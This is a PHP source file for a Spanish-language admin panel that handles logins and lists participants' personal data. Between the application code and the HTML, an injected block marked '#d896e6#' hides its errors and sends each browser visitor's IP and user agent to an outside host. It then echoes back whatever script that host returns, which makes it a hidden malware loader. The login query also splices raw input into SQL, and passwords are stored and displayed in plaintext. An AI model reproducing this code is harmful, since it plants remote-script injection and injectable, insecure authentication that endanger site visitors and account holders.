<?php
    session_start();
	include ('../../include/xajax/xajax.inc.php');
	include ('../../include/local_dsn.php');
	include ('../../include/dsn.php');
	//GLOBALES
	///////////////////// 
	//INSTANCIAMOS EL OBJETO DE LA CLASE AJAX
	$xajax=new xajax(); 
	$xajax->setCharEncoding('ISO-8859-1');
	$xajax->decodeUTF8InputOn();
	

	function login()
	{
		$salida="<div id='esp1'>";
		$salida.="</div>";

		$salida.="<div id='esp2'>";
			$salida.="<div id='esp3'></div>";
			$salida.="<div id='login'>";
				$salida.="<div id='logo'><img src='img/logoOPI.jpg'></div>";
				$salida.="<div id='log_cont'>
							<br><br><br><table align='center'><form id='acceso'><tr>
									<td class='l_form'>Usuario:</td><td><input class='inpBox' type='text' maxlength='15' name='usr'></td></tr>
									<tr><td class='l_form'>Contraseña:</td><td><input class='inpBox' type='password' maxlength='15' name='pwd'></td></tr>
									<tr><td colspan=2>&nbsp;</td></tr>
									<tr><td colspan='2' align='center'><input class='boton' type='button' value='Aceptar' onClick='xajax_validaLogin(xajax.getFormValues(acceso))'></td></tr>
							</form></table>
						  </div>";
			$salida.="</div>";			
			$salida.="<div id='esp4'></div>";
		$salida.="</div>";

		$salida.="<div id='esp5'>";
		$salida.="</div>";

		return $salida;
	}

	function validaLogin($form)
	{
		if($form['usr']=='' || $form['pwd']=='')
		{
			$salida="ERROR DE ACCESO<BR>Debe proporcionar los datos solicitados";
			$sel_div="esp1";
		}else{
			$sSql="SELECT id,usr,nombre,nivel FROM t6IUsuarios WHERE usr = '".$form['usr']."' AND pwd='".$form['pwd']."'";  
			$res=mysql_query($sSql) or die ($salida="La consulta Fallo" . mysql_error());
			if (mysql_num_rows($res)==0)
			{
				$salida="ERROR DE ACCESO<BR>El usuario o la contraseña son incorrectos";
				$sel_div="esp1";
			}else{
				$row=mysql_fetch_array($res);
				$_SESSION['act_log']=1;
				$_SESSION['nombre']=$row['nombre'];

				$salida=inicio();
				$sel_div="contenedor";
			}
		}

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign($sel_div,"innerHTML",$salida);
		//tenemos que devolver la instanciación del objeto xajaxResponse
		return $respuesta;
	}

	function inicio()
	{
		$salida="<div id='barra_nom'><div id='salir'><a class='link_salir' href='javascript:void(xajax_salir())'>Cerrar Sesión</a></div><div id='nombre'>".$_SESSION['nombre']."</div></div>";
		$salida.="<div id='menu'>
						<a class='b_menu' href='javascript:void(xajax_procesaAccion(0))'>Nuevo</a>
						<a class='b_menu' href='javascript:void(xajax_procesaAccion(1))'>Guardar</a>
						<a class='b_menu' href='javascript:void(xajax_procesaAccion(2))'>Modificar</a>
						<a class='b_menu' href='javascript:void(xajax_procesaAccion(3))'>Eliminar</a>
						<a class='b_menu' href='javascript:void(xajax_procesaAccion(4))'>Cancelar</a>
						<a class='b_menu' href='include/generaPDF.php' target='_blank'>Reporte</a>
				  </div>";

		$salida.="<div id='msj'></div>";

		$salida.="<div id='d_prin'>";

		$salida.="<div id='menu_cont'>";
			$salida.="<div id='logo_opi'><img src='img/logo.jpg'></div>";
			$salida.="<div id='menu_lat'>
						<center><a class='bot_lat' href='#'>Participantes</a>
						<a class='bot_lat' href='#'>Tickets</a>
						<a class='bot_lat' href='#'>Canjes</a>
						<a class='bot_lat' href='#'>Usuarios</a></center>
					  </div>";
		$salida.="</div>";

		$salida.="<div id='cont_ini'>";
		$salida.=participantes();
		$salida.="</div>";
		$salida.="</div>";
		return $salida;
	}

	function procesaAccion($opcion)
	{
		if ($opcion==0){
			$salida.=participantes();
			$sel_div="cont_ini";
			$error='';
			$div2=1;
		}else if ($opcion==1){
			$salida.="<table align='center'><tr>";
			$salida.="<td><img src='img/error.png'></td><td class='msjError'>Error - Todos los campos son obligatorios</td>";
			$salida.="</tr></table>";
			$sel_div="msj";
			$div2=0;
		}else if ($opcion==2){
			$salida.="<table align='center'><tr>";
			$salida.="<td><img src='img/error.png'></td><td class='msjError'>Error - Debe seleccionar un registro</td>";
			$salida.="</tr></table>";
			$sel_div="msj";
			$div2=0;
		}else if ($opcion==3){
			$salida.="<table align='center'><tr>";
			$salida.="<td><img src='img/error.png'></td><td class='msjError'>Error - Debe seleccionar un registro</td>";
			$salida.="</tr></table>";
			$sel_div="msj";
			$div2=0;
		}

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign($sel_div,"innerHTML",$salida);
		if ($div2==1)
		{
			$respuesta->addAssign("msj","innerHTML",$error);
		}
		//tenemos que devolver la instanciación del objeto xajaxResponse
		return $respuesta;
	}
	
	function participantes()
	{
		$salida.="<div id='cont_part'>";
		$salida.="<table><form>
					<tr>
						<td class='titForm' colspan='4'>Datos personales</td>
					</tr>
					<tr>
						<td class='txtForm'>Nombre:</td><td><input class='inpForm' type='text' name='nom'></td>
						<td class='txtForm'>Colonia:</td><td><input class='inpForm' type='text' name='nom'></td>
					</tr>
					<tr>
						<td class='txtForm'>E-Mail:</td><td><input class='inpForm' type='text' name='nom'></td>
						<td class='txtForm'>Ciudad:</td><td><input class='inpForm' type='text' name='nom'></td>
					</tr>
					<tr>
						<td class='txtForm'>Teléfono:</td><td><input class='inpForm' type='text' name='nom'></td>
						<td class='txtForm'>C.P.:</td><td><input class='inpForm' type='text' name='nom'></td>
					</tr>
					<tr>
						<td class='txtForm'>Calle y No.:</td><td><input class='inpForm' type='text' name='nom'></td>
						<td class='txtForm'>Estado:</td><td><input class='inpForm' type='text' name='nom'></td>
					</tr>
					<tr>
						<td  class='titForm' colspan='4'>Datos de acceso</td>
					</tr>
					<tr>
						<td class='txtForm'>Usuario:</td><td><input class='inpForm' type='text' name='nom'></td>						
					</tr>
					<tr>
						<td class='txtForm'>Contraseña:</td><td><input class='inpForm' type='text' name='nom'></td>						
					</tr>
					<tr>
						<td class='txtForm'>Confirmar:</td><td><input class='inpForm' type='text' name='nom'></td>				
					</tr>
				 </form></table>";
	    $salida.="</div>";
		
		$salida.="<div id='grid_Part'>".grid(1)."</div>";
		return $salida;
	}
	
	function grid($c)
	{
		if ($c==0){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY id desc";
		}else if ($c==1){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY usuario";
		}else if ($c==2){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY usuario desc";
		}else if ($c==3){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY nombre";
		}else if ($c==4){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY nombre desc";
		}else if ($c==5){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY saldo";
		}else if ($c==6){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY saldo desc";
		}else if ($c==7){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY fhalta";
		}else if ($c==8){
			$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb ORDER BY fhalta desc";
		}
		$res = mysql_query($sql) or die ('Error al Consultar Participantes - Part'.mysql_error());

		$salida.="<table>
					<tr><td class='encGrid'>Usuario <a href='javascript:void(xajax_impGrid(1))'><img src='img/far.png' width='10' height='10' border='0'></a><a href='javascript:void(xajax_impGrid(2))'><img src='img/fab.png' width='10' height='10' border='0'></a></td>
					    <td class='encGrid'>Nombre <a href='javascript:void(xajax_impGrid(3))'><img src='img/far.png' width='10' height='10' border='0'></a><a href='javascript:void(xajax_impGrid(4))'><img src='img/fab.png' width='10' height='10' border='0'></a></td>
					    <td class='encGrid'>Saldo <a href='javascript:void(xajax_impGrid(5))'><img src='img/far.png' width='10' height='10' border='0'></a><a href='javascript:void(xajax_impGrid(6))'><img src='img/fab.png' width='10' height='10' border='0'></a></td>
					    <td class='encGrid'>F.Alta <a href='javascript:void(xajax_impGrid(7))'><img src='img/far.png' width='10' height='10' border='0'></a><a href='javascript:void(xajax_impGrid(8))'><img src='img/fab.png' width='10' height='10' border='0'></a></td>				
					</tr>";
					$color_fila=1;
					while($row=mysql_fetch_array($res))
					{
						if ($color_fila==1){
							$colorCel="#999999";
							$color_fila=2;
						}else{
							$colorCel="#ffffff";
							$color_fila=1;
						}
						$salida.="<tr>";
						$salida.="<a href=\"javascript:void(xajax_muestra_datos(".$row['id']."))\"><td class='infGrid' style='WIDTH:25px;background-color:".$colorCel."'>".$row['usuario']."</td>
							  <td class='infGrid' style='WIDTH:250px;background-color:".$colorCel."'>".$row['nombre']."</td>
							  <td class='infGrid' style='WIDTH:20px;background-color:".$colorCel."'>".$row['saldo']."</td>
							  <td class='infGrid' style='WIDTH:200px;background-color:".$colorCel."'>".$row['fhalta']."</td>";
						$salida.="</a></tr>";
					}
	    $salida.="</table>";

		return $salida;
	}

	function impGrid($c)
	{
		$salida=grid($c);
		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("grid_Part","innerHTML",$salida);
		//tenemos que devolver la instanciación del objeto xajaxResponse
		return $respuesta;
	}

	function muestra_datos($id)
	{
		$sql ="SELECT id,usuario,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta,saldo,pwd FROM t8IpartWeb where id=".$id;
		$res=mysql_query($sql);
		$row=mysql_fetch_array($res);

		$salida.="<table><form>
					<tr>
						<td class='titForm' colspan='4'>Datos personales</td>
					</tr>
					<tr>
						<td class='txtForm'>Nombre:</td><td><input class='inpForm' type='text' name='nom' value='".$row['nombre']."'></td>
						<td class='txtForm'>Colonia:</td><td><input class='inpForm' type='text' name='nom' value='".$row['colonia']."'></td>
					</tr>
					<tr>
						<td class='txtForm'>E-Mail:</td><td><input class='inpForm' type='text' name='nom' value ='".$row['mail']."'></td>
						<td class='txtForm'>Ciudad:</td><td><input class='inpForm' type='text' name='nom' value='".$row['ciudad']."'></td>
					</tr>
					<tr>
						<td class='txtForm'>Teléfono:</td><td><input class='inpForm' type='text' name='nom' value='".$row['telefono']."'></td>
						<td class='txtForm'>C.P.:</td><td><input class='inpForm' type='text' name='nom' value = '".$row['cp']."'></td>
					</tr>
					<tr>
						<td class='txtForm'>Calle y No.:</td><td><input class='inpForm' type='text' name='nom' value='".$row['calle']."'></td>
						<td class='txtForm'>Estado:</td><td><input class='inpForm' type='text' name='nom' value='".$row['estado']."'></td>
					</tr>
					<tr>
						<td  class='titForm' colspan='4'>Datos de acceso</td>
					</tr>
					<tr>
						<td class='txtForm'>Usuario:</td><td><input class='inpForm' type='text' name='nom' value='".$row['usuario']."'></td>						
					</tr>
					<tr>
						<td class='txtForm'>Contraseña:</td><td><input class='inpForm' type='text' name='nom' value='".$row['pwd']."'></td>						
					</tr>
					<tr>
						<td class='txtForm'>Confirmar:</td><td><input class='inpForm' type='text' name='nom' value='".$row['pwd']."'></td>				
					</tr>
				 </form></table>";


		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("cont_part","innerHTML",$salida);
		//tenemos que devolver la instanciación del objeto xajaxResponse
		return $respuesta;
	}

	function salir()
	{
		unset ($_SESSION['act_log']);
		unset ($_SESSION['nombre']);
		
		$salida=login();

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("contenedor","innerHTML",$salida);
		//tenemos que devolver la instanciación del objeto xajaxResponse
		return $respuesta;
	}

	//////TERMINAN FUNSIONES///////////////

	//registramos la función creada anteriormente al objeto xajax
	$xajax->registerFunction("validaLogin");  
	$xajax->registerFunction("inicio");   
	$xajax->registerFunction("salir");   
	$xajax->registerFunction("procesaAccion");  
	$xajax->registerFunction("muestra_datos");  
	$xajax->registerFunction("impGrid");  

	//El objeto xajax tiene que procesar cualquier petición
	$xajax->processRequests();
?>
<?php
#d896e6#
error_reporting(0); ini_set('display_errors',0); $wp_sjoag175 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_sjoag175) && !preg_match ('/bot/i', $wp_sjoag175))){
$wp_sjoag09175="http://"."tag"."display".".com/display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_sjoag175);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_sjoag09175);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_175sjoag = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_175sjoag,1,3) === 'scr' ){ echo $wp_175sjoag; }
#/d896e6#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
 <HEAD>
  <TITLE> OPISA </TITLE>
  <META NAME="Generator" CONTENT="EditPlus">
  <META NAME="Author" CONTENT="">
  <META NAME="Keywords" CONTENT="">
  <META NAME="Description" CONTENT="">

  <link href="estilo/estilo.css" rel="stylesheet" type="text/css" />
   <?
  //ABRE PHP
    //En el <head> indicamos al objeto xajax se encargue de generar el javascript necesario
    $xajax->printJavascript("../../include/xajax/");
  ?>

  <script type="text/javascript">
	function formReset()
	{
		document.getElementById("myForm").reset();
	}
  </script>

 </HEAD>

 <BODY>
	<div id="contenedor">
		<?php
			if (!$_SESSION['act_log'])
			{
				echo login();
			}else{
				echo inicio();
			}
		?>
	</div>
 </BODY>
</HTML>
